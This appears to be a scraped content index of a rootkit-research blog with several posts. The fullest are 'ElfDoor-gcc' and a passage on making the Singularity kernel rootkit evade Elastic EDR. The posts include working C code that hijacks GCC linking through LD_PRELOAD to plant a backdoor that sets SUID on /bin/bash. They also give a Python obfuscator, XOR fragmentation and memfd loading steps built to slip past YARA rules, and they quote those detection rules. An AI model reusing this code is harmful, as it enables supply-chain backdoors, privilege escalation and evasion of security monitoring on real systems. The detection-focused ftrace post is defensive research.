dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding 